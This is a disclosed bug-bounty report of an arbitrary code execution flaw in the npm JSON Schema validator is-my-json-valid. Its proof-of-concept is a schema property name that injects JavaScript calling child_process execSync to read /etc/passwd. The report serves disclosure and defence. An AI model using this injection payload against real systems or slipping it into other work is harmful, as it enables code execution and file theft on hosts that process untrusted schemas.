# Arbitrary code execution via untrusted schemas in is-my-json-valid

## Report Details
- **Report ID**: 894308
- **URL**: https://hackerone.com/reports/894308
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-06-09T08:14:52.148Z
- **Disclosed**: 2020-07-31T17:14:47.733Z

## Reporter
- **Username**: chalker
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report an arbitrary code execution vulnerability in `is-my-json-valid`.
It allows to execute arbitrary code if an attacker-controlled schema is passed to `is-my-json-valid`.

The module Readme doesn't say anything about the risks of untrusted schemas, so I by default assume that this is applicable.
If it's not applicable, please place a warning in the readme that users should never use untrusted schemas.

# Module

**module name:** is-my-json-valod
**version:** 2.20.0
**npm page:** `https://www.npmjs.com/package/is-my-json-valid`

## Module Description

> A JSONSchema validator that uses code generation to be extremely fast.

## Module Stats

1 517 862 weekly downloads

# Vulnerability

## Vulnerability Description

See steps to reproduce.

The problem is in `formatName` function.

## Steps To Reproduce:

```js
const validator = require('is-my-json-valid')
const schema = {
  type: 'object',
  properties: {
    'x[console.log(process.mainModule.require(`child_process`).execSync(`cat /etc/passwd`).toString(`utf-8`))]': {
      required: true,
      type:'string'
    }
  },
}
var validate = validator(schema);
validate({})
```

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

Executing arbitrary js code and/or shell commands if the schema is attacker-controlled (e.g. user supplies JSON with a schema).

## Attachments
No attachments
